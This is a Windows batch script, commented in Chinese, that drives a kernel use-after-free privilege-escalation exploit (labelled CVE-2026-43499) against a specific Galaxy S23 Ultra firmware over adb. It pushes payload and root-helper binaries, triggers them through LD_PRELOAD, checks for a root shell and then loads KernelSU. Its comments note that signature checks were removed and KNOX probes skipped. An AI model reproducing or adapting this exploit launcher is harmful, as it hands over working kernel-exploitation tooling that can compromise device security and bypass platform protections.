@echo off
rem ===========================================================================
rem  s9110-root-kit dm3q 适配版 — Galaxy S23 Ultra (SM-S9180 / S9180ZHS8FZG1)
rem  内存态 root + KernelSU（签名授权已去除，KNOX 探针已跳过）
rem  CVE-2026-43499 (GhostLock) 内核 UAF 提权
rem
rem  用法:
rem    run_root_dm3q.cmd              完整流程
rem    run_root_dm3q.cmd --verify     只检查设备状态
rem    run_root_dm3q.cmd --no-app     不装 KernelSU Manager
rem    run_root_dm3q.cmd --skip-push  跳过推送
rem    run_root_dm3q.cmd -n 2         重试 2 次
rem    set ADB_BIN=C:\path\adb.exe   指定 adb
rem
rem  !!! KNOX e-fuse 风险自负。已跳过 KNOX 探针。
rem  注意：此文件须保持 GBK/ANSI 编码 + CRLF 换行。
rem ===========================================================================

setlocal enabledelayedexpansion

rem ---------- config ----------
set "SCRIPT_DIR=%~dp0"
set "PAYLOAD=%SCRIPT_DIR%payloads\dm3q-S9180ZHS8FZG1__payload"
set "ROOT_HELPER=%SCRIPT_DIR%payloads\dm3q-S9180ZHS8FZG1__root"
set "KSUD=%SCRIPT_DIR%tools\ksud-samsung-android13-5.15-kdp"
set "APK=%SCRIPT_DIR%tools\KernelSU_Manager_v3.2.5_32525.apk"

set "DEV_PAYLOAD=/data/local/tmp/cve-2026-43499"
set "DEV_ROOT=/data/local/tmp/cve-2026-43499-root"
set "DEV_KSUD=/data/local/tmp/ksud-selected"

set "ATTEMPTS=1"
set "DO_PUSH=1"
set "DO_APP=1"
set "MODE=full"
set "WARMUP=400"
set "TARGET_FW=S9180ZHS8FZG1"

rem ---------- arg parse ----------
:parse_args
if "%~1"=="" goto args_done
if /i "%~1"=="--verify" set "MODE=verify" & shift & goto parse_args
if /i "%~1"=="--skip-push" set "DO_PUSH=0" & shift & goto parse_args
if /i "%~1"=="--no-app" set "DO_APP=0" & shift & goto parse_args
if /i "%~1"=="-n" set "ATTEMPTS=%~2" & shift & shift & goto parse_args
if /i "%~1"=="-h" goto usage
if /i "%~1"=="/?" goto usage
echo [ERR] unknown arg: %~1
goto :exit
:usage
echo usage: run_root_dm3q.cmd [--verify] [--skip-push] [--no-app] [-n N]
goto :exit
:args_done

rem ---------- find adb ----------
set "ADB="
if defined ADB_BIN (
  if exist "%ADB_BIN%" set "ADB=%ADB_BIN%"
)
if not defined ADB (
  where adb >nul 2>&1 && set "ADB=adb"
)
if not defined ADB (
  for %%p in ("%SCRIPT_DIR%adb-bin\adb.exe" "%LOCALAPPDATA%\Android\Sdk\platform-tools\adb.exe" "C:\platform-tools\adb.exe" "D:\platform-tools\adb.exe") do (
    if exist "%%~p" set "ADB=%%~p"
  )
)
if not defined ADB (
  echo [ERR] adb not found. Set ADB_BIN=C:\path\adb.exe or install platform-tools.
  goto :exit
)
set "ADB=%ADB:/=\%"
echo [OK] using adb: %ADB%

rem ---------- device check ----------
"%ADB%" get-state >nul 2>&1
if errorlevel 1 (
  echo [ERR] adb cannot reach device
  goto :exit
)
"%ADB%" get-state 2>nul | findstr /i "device" >nul
if errorlevel 1 (
  echo [ERR] device state is not "device"
  goto :exit
)
echo [OK] device connected

rem ---------- firmware check ----------
for /f "delims=" %%i in ('"%ADB%" shell getprop ro.build.fingerprint 2^>nul') do set "FP=%%i"
for /f "delims=" %%i in ('"%ADB%" shell uname -r 2^>nul') do set "KERNEL=%%i"
echo kernel: !KERNEL!
echo fingerprint: !FP!
echo !FP! | findstr /i "%TARGET_FW%" >nul
if errorlevel 1 (
  echo [WARN] firmware mismatch! expected %TARGET_FW%
  set /p ans="force continue? (type YES): "
  if /i not "!ans!"=="YES" goto :exit
)

rem ---------- KNOX probe SKIPPED (per user request) ----------
echo [WARN] KNOX probe SKIPPED. e-fuse risk is yours.

if /i "%MODE%"=="verify" goto verify_mode

rem ---------- push ----------
if "%DO_PUSH%"=="1" (
  echo [*] pushing files...
  if not exist "%PAYLOAD%" ( echo [ERR] missing payload & goto :exit )
  if not exist "%ROOT_HELPER%" ( echo [ERR] missing root helper & goto :exit )
  if not exist "%KSUD%" ( echo [ERR] missing ksud & goto :exit )
  "%ADB%" push "%PAYLOAD%" "%DEV_PAYLOAD%" || ( echo [ERR] push payload failed & goto :exit )
  "%ADB%" push "%ROOT_HELPER%" "%DEV_ROOT%" || ( echo [ERR] push root failed & goto :exit )
  "%ADB%" push "%KSUD%" "%DEV_KSUD%" || ( echo [ERR] push ksud failed & goto :exit )
  "%ADB%" shell "chmod 755 %DEV_PAYLOAD% %DEV_ROOT% %DEV_KSUD%"
  echo [OK] files pushed
) else (
  echo [WARN] skip push
)

rem ---------- warmup ----------
echo [*] warmup %WARMUP%x /system/bin/true
"%ADB%" shell "i=0; while [ $i -lt %WARMUP% ]; do /system/bin/true; i=$((i+1)); done"

rem ---------- exploit ----------
echo [*] triggering exploit, attempts=%ATTEMPTS% (device may reboot - normal)
set "ROOT_OK=0"

for /l %%a in (1,1,3) do (
  echo [*] exploit attempt %%a/3
  "%ADB%" wait-for-device >nul 2>&1
  ping -n 3 127.0.0.1 >nul 2>&1
  "%ADB%" shell "CVE43499_ROOT_HELPER=%DEV_ROOT% EXPLOIT_ATTEMPTS=%ATTEMPTS% LD_PRELOAD=%DEV_PAYLOAD% /system/bin/true"
  if "!ROOT_OK!"=="1" goto root_done

  rem verify via helper
  "%ADB%" exec-out "%DEV_ROOT%" -c /system/bin/id 2>nul | findstr /i "uid=0(root)" >nul && set "ROOT_OK=1"
  if "!ROOT_OK!"=="1" goto root_done
)

:root_done
if not "%ROOT_OK%"=="1" (
  echo [ERR] exploit did not obtain root.
  echo   * reboot device and rerun
  echo   * if "verification failed E101" appears, payload/root not patched
  goto :exit
)
echo [OK] root obtained
"%ADB%" exec-out "%DEV_ROOT%" -c /system/bin/id

rem ---------- KernelSU ----------
echo [*] installing KernelSU (late-load)
"%ADB%" shell "%DEV_ROOT%" --late-load
ping -n 3 127.0.0.1 >nul 2>&1
"%ADB%" shell "cat /proc/modules" | findstr /i "kernelsu" >nul
if not errorlevel 1 (
  echo [OK] kernelsu loaded
  "%ADB%" shell "cat /proc/modules" | findstr /i kernelsu
) else (
  echo [ERR] kernelsu not in /proc/modules
  echo retry: %ADB% shell %DEV_ROOT% --late-load
)

rem ---------- KernelSU Manager app ----------
if "%DO_APP%"=="1" (
  echo [*] installing KernelSU Manager app...
  "%ADB%" install -r "%APK%" && (
    echo [OK] KernelSU Manager installed
    "%ADB%" shell am start -n me.weishu.kernelsu/.ui.MainActivity >nul 2>&1
  ) || echo [WARN] app install failed - install manually
)

echo.
echo ============================================================
echo  done. Memory root - reboot to clear, rerun to re-root.
echo  If "operation failed": reboot device first, then rerun.
echo  KNOX probes were skipped per user request.
echo ============================================================
goto :exit

:verify_mode
echo [*] verify mode (dm3q / %TARGET_FW%)
"%ADB%" shell "ls -l %DEV_PAYLOAD% %DEV_ROOT% %DEV_KSUD%"
"%ADB%" shell "cat /proc/modules" | findstr /i "kernelsu" >nul
if not errorlevel 1 ( echo [OK] kernelsu loaded - device currently rooted ) else ( echo [WARN] kernelsu not loaded )
echo [OK] verify done
goto :exit

:exit
echo.
echo press any key to close...
pause >nul
